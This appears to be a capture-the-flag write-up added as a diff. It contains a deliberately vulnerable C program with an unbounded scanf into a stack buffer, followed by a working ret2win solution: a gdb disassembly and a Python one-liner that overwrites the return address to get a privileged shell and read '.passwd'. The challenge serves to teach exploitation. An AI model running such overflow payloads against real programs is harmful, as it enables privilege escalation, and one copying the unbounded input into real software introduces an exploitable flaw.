@@ -1,0 +1,53 @@
+# first step to 64 bits
+
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+/*
+gcc -o ch35 ch35.c -fno-stack-protector  -Wl,-z,relro,-z,now,-z,noexecstack
+*/
+
+void callMeMaybe(){
+    setreuid(geteuid(), geteuid());
+    system("/bin/bash");
+}
+
+int main(int argc, char **argv){
+
+    char buffer[256];
+    int len, i;
+
+    scanf("%s", buffer);
+    len = strlen(buffer);
+
+    printf("Hello %s\n", buffer);
+
+    return 0;
+}
+
+# Solution
+app-systeme-ch35@challenge03:~$ gdb-peda ./ch35
+gdb-peda$ pdisass callMeMaybe
+Dump of assembler code for function callMeMaybe:
+   0x00000000004006cd <+0>:     push   rbp
+   0x00000000004006ce <+1>:     mov    rbp,rsp
+   0x00000000004006d1 <+4>:     push   rbx
+   0x00000000004006d2 <+5>:     sub    rsp,0x8
+   0x00000000004006d6 <+9>:     call   0x400590 <geteuid@plt>
+   0x00000000004006db <+14>:    mov    ebx,eax
+   0x00000000004006dd <+16>:    call   0x400590 <geteuid@plt>
+   0x00000000004006e2 <+21>:    mov    esi,ebx
+   0x00000000004006e4 <+23>:    mov    edi,eax
+   0x00000000004006e6 <+25>:    call   0x4005c0 <setreuid@plt>
+   0x00000000004006eb <+30>:    mov    edi,0x4007e4
+   0x00000000004006f0 <+35>:    call   0x400570 <system@plt>
+   0x00000000004006f5 <+40>:    add    rsp,0x8
+   0x00000000004006f9 <+44>:    pop    rbx
+   0x00000000004006fa <+45>:    pop    rbp
+   0x00000000004006fb <+46>:    ret
+End of assembler dump.
+
+(python -c 'print "A" * 280 + "\x00\x00\x00\x00\x00\x40\x06\xcd"[:: - 1]'; /bin/echo cat .passwd ) | ./ch35
